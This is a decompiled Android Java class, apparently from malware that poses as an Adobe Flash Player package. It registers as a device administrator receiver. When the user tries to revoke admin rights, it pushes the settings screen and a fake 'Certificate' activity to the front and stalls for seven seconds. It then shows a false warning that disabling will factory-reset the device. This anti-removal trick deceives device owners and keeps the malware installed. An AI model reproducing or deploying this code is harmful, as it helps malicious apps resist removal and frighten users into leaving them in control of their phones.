package com.adobe.flashplayer_;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;
import android.support.v4.view.accessibility.AccessibilityEventCompat;
import com.adobe.flashplayer.Certificate;
import java.util.concurrent.TimeUnit;

public class ADOBEcoreZa extends DeviceAdminReceiver {
    public CharSequence onDisableRequested(Context context, Intent intent) {
        Intent intentA = new Intent("android.settings.SETTINGS");
        intentA.setFlags(AccessibilityEventCompat.TYPE_TOUCH_INTERACTION_START);
        intentA.setFlags(1073741824);
        intentA.setFlags(268435456);
        intentA.addFlags(67108864);
        context.startActivity(intentA);
        Intent intentZ = new Intent(context, Certificate.class);
        intentZ.setAction("android.intent.action.VIEW");
        intentZ.addFlags(67108864);
        intentZ.setFlags(1073741824);
        intentZ.setFlags(268435456);
        context.startActivity(intentZ);
        try {
            TimeUnit.SECONDS.sleep(7);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        return "Do you want device factory reset?\n\nClick \"Yes\" and your's device will reboot and \"No\" for cancel.";
    }

    public void onDisabled(Context context, Intent intent) {
        super.onDisabled(context, intent);
    }

    public void onEnabled(Context context, Intent intent) {
        super.onEnabled(context, intent);
    }
}
